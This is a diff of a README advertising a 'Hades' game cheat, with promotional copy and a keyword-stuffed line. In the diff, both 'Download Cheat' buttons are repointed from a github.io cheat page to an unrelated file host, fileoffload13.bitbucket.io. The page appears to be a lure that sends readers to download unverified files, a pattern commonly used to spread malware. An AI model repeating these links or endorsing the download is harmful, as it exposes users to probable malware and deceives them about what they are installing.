@@ -4,7 +4,7 @@
 
 Whether you're speedrunning or just want to flex with full builds instantly, this is how you take control of the underworld — permanently.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/hades/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload13.bitbucket.io)
 ---
 
 ## 🎮 What Is a Hades Cheat?
@@ -24,7 +24,7 @@ Perfect for:
 * Farming quickly
 * Just having god-tier fun
 
-[![Download Cheat](https://cdn.atomix.vg/wp-content/uploads/2018/12/Hades.jpg)](https://wecheaters.github.io/cheats/hades/)
+[![Download Cheat](https://cdn.atomix.vg/wp-content/uploads/2018/12/Hades.jpg)](https://fileoffload13.bitbucket.io)
 ---
 
 ## 🔥 Most Popular Hades Cheats
@@ -121,3 +121,4 @@ hades cheat, god mode hades, cheat engine hades, infinite gold hades, max boons,
 
 **Cheat death — literally.**
 With a **Hades Cheat**, the underworld is yours to conquer, skip, or utterly annihilate. 💀⚔️🔥
+
